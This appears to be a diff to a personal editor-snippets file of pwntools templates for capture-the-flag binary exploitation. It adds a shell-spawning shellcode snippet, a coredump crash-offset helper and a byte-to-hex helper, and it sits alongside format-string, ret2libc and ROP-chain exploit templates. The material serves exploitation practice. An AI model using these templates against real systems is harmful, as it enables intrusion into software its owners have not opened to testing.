@@ -34,6 +34,15 @@ snippet pwn "general pwntools template"
 	io.sendline(payload)
 	print io.recvall()
 
+snippet sc "shellcode payload"
+	shellcode = asm(shellcraft.${1:i386 | amd64}.linux.sh())
+
+# sample use case: you leak an address/canary, but you want to visually inspect the bytes
+# you really should know this by now, but it's easy to forget/doubt yourself when panicking
+# pack converts hex (eg 0x41414141) into chars (pack(0x41414141) == "AAAA"), unpack does the opposite
+snippet strtohex "convert string of raw bytes to hexstring (eg 0xdeadbeef)"
+	hex(unpack(${1:data}, 'all'))
+
 # modded from https://github.com/Naetw/CTF-pwn-tips#find-binsh-or-sh-in-library
 # Note: you'll have to find the base yourself
 # For a local binary without aslr, you can do sth like this:
@@ -52,6 +61,7 @@ snippet ret2libc "prepping ret2libc payload fodder"
 
 # https://github.com/tnballo/notebook/wiki/Pwntools-Snippets#generate-a-format-string-exploit-for-arbitrary-write
 # Uses a linear search for the offset, so might not be great if the offset is very large, but otherwise this is M A G I C
+# TODO: tweak this snippet to work for format1
 snippet fmt "automatic fsb exploit generation"
 	from pwn import *
 
@@ -59,6 +69,7 @@ snippet fmt "automatic fsb exploit generation"
 	ADDR = ${2:0x8049868}
 
 	# Wrapper for vuln binary
+	# Edit this depending on program output
 	def exec_fmt(payload):
 		 io = process('./${3:vuln_binary}')
 		 io.sendline(payload)
@@ -158,6 +169,12 @@ snippet gdbe "gdb, break on entry point. Requires pwndbg"
 		''',
 		gdb_args=['-q'])
 
+
+snippet dump "Coredump: has useful info incl. esp and eip at segfault"
+	core = Coredump('./core')                                              
+	print hex(core.eip) 
+	print cyclic_find(core.eip) #offset is at: 
+	print hex(core.esp) #only useful if ASLR is off
 ## Z3 ##
 
 # modded from https://www.youtube.com/watch?v=b92CW-NZ3l0
@@ -241,3 +258,5 @@ snippet angrop
 	#chain = rop.add_to_mem(0x804f124, 0x41414141)
 
 	chain.print_payload_code()
+
+#TODO: make snippets for web
